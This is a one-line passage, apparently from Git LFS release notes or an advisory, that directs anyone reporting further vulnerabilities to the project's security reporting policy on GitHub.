* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).
